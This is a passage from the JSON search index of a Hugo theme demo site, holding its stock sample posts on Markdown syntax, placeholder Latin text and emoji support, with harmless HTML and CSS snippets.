highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"","id":143,"section":"blog","tags":["markdown","css","html","themes"],"title":"Markdown Syntax Guide","uri":"https://codthing.github.io/blog/markdown-syntax/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":144,"section":"docs","tags":["markdown","css","html","themes"],"title":"Section","uri":"https://codthing.github.io/docs/contentmanagement/sections/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\ninhospita parcite confusaque translucet patri vestro qui optatis\nlumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\n Exierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude  Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus\nsilentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria\ntractus malis.\n Comas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et  Vagus elidunt \nThe Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra\ndicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere\nfurit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli\nLelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare\nEchionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert\nausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae\nvulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem\nPropoetides parte.\n","description":"","id":145,"section":"blog","tags":["markdown","text"],"title":"Placeholder Text","uri":"https://codthing.github.io/blog/placeholder-text/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nEmoji can be enabled in a Hugo project in a number of ways.\n\rThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site’s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 🙈 🙉 🙉 🙊 🙊\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3  .emoji { font-family: Apple Color Emoji,Segoe UI Emoji,NotoColorEmoji,Segoe UI Symbol,Android Emoji,EmojiSymbols; }  ","description":"","id":146,"section":"blog","tags":["emoji"],"title":"Emoji Support","uri":"https://codthing.github.io/blog/emoji-support/"}]